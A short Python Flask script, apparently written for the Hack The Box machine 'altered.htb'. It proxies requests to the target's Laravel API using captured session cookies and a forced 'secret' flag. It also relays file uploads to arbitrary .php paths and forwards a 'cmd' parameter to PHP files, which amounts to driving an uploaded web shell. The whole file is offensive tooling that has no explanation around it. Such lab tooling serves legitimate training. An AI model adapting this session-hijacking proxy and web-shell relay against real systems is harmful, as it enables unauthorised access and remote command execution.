#!/usr/bin/python3

import requests
from flask import Flask, request

XSRF_TOKEN = ''
LARAVEL_SESSION = ''

app = Flask(__name__)

@app.route('/', methods=['GET'])
def get_id():
    id_value = request.args.get('id')
    cookies = {
    'XSRF-TOKEN': XSRF_TOKEN,
    'laravel_session': LARAVEL_SESSION,
    }
    headers = {
     'Content-Type': 'application/json',
    }
    json_data = {
        'id': id_value,
        'secret': True,
    }
    r = requests.get('http://altered.htb/api/getprofile', cookies=cookies, headers=headers, json=json_data, verify=False)
    return r.text

@app.route('/<path:filename>.php', methods=['GET', 'POST'])
def handler(filename):
    method = request.method
    if method == 'POST':
        data = request.form.to_dict()
        uploaded_file = request.files.get('file')
        files = {
            'file': (uploaded_file.filename, uploaded_file.stream, uploaded_file.content_type)
        }
        r = requests.post(f'http://altered.htb/{filename}.php', data=data, files=files, verify=False,)

    elif method == 'GET':
        cmd = request.args.get('cmd')
        r = requests.get(f'http://altered.htb/{filename}.php?cmd={cmd}')

    return r.text
    
if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=1337)
